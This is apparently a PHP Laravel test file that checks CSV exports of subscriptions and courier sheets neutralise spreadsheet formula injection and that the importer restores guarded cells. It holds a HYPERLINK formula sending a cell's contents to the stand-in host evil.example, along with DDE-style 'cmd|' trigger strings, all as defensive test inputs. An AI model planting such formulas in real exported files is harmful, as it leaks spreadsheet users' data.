<?php

namespace Tests\Feature\Import;

use App\Domain\Campaigns\GiftListExporter;
use App\Domain\Import\CsvReader;
use App\Domain\Import\ImportOptions;
use App\Domain\Import\SubscriptionExporter;
use App\Domain\Import\SubscriptionImporter;
use App\Models\InstallmentPlan;
use App\Models\Shop;
use App\Support\CsvCell;
use App\Support\Tenant;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Shopper-typed text in an export must open as TEXT in a spreadsheet, never as
 * a formula — and our own importer must read the guarded cell back unchanged.
 */
final class CsvFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    // === CONSTANTS ===
    private const FORMULA_NAME = '=HYPERLINK("https://evil.example/?x="&B2;"click")';

    /** @var list<string> */
    private array $files = [];

    protected function tearDown(): void
    {
        foreach ($this->files as $file) {
            @unlink($file);
        }

        Tenant::clear();
        parent::tearDown();
    }

    public function test_every_formula_trigger_is_neutralised_and_numbers_are_not(): void
    {
        foreach (['=1+1', '+cmd', '-cmd|x', '@SUM(A1)', "\tfoo", "\rfoo"] as $cell) {
            $this->assertSame("'".$cell, CsvCell::neutralise($cell));
            $this->assertSame($cell, CsvCell::restore(CsvCell::neutralise($cell)));
        }

        foreach (['-12.50', '+972501234567', 'Dana', '', "O'Brien"] as $cell) {
            $this->assertSame($cell, CsvCell::neutralise($cell));
        }
    }

    public function test_the_subscription_export_guards_a_formula_name_and_reimports_it_intact(): void
    {
        $shop = Shop::create(['shopify_domain' => 'csv-inj.myshopify.com', 'name' => 'Csv', 'status' => Shop::STATUS_ACTIVE]);
        Tenant::set($shop);

        $source = $this->file("membership_id,product_id,first_name,cycle,plan_amount,status,auto_renew,current_period_end\n"
            .'9001,7788,"'.str_replace('"', '""', self::FORMULA_NAME).'",monthly,50.00,active,1,2026-09-01 00:00:00'."\n");
        $report = (new SubscriptionImporter)->import($shop, $source, new ImportOptions);
        $this->assertFalse($report->aborted, $report->abortReason ?? '');

        $exported = $this->file('');
        (new SubscriptionExporter)->toFile($shop, $exported);

        $raw = (string) file_get_contents($exported);
        $this->assertStringContainsString("'".str_replace('"', '""', self::FORMULA_NAME), $raw);
        $this->assertStringNotContainsString(',"'.str_replace('"', '""', self::FORMULA_NAME), $raw);

        // Our own reader strips the guard again.
        $names = [];
        foreach ((new CsvReader($exported))->rows() as $row) {
            $names[] = $row['values']['first_name'] ?? null;
        }
        $this->assertContains(self::FORMULA_NAME, $names);

        $this->assertSame(1, InstallmentPlan::query()->count());
    }

    public function test_the_courier_sheet_writer_guards_its_cells_too(): void
    {
        $handle = fopen('php://memory', 'w+');
        $put = new \ReflectionMethod(GiftListExporter::class, 'put');
        $put->invoke(app(GiftListExporter::class), $handle, ['@SUM(1+1)*cmd|x', 'Herzl 1']);
        rewind($handle);

        $this->assertSame("'@SUM(1+1)*cmd|x,\"Herzl 1\"", trim((string) stream_get_contents($handle)));
    }

    private function file(string $contents): string
    {
        $path = tempnam(sys_get_temp_dir(), 'lets-csv-').'.csv';
        file_put_contents($path, $contents);
        $this->files[] = $path;

        return $path;
    }
}
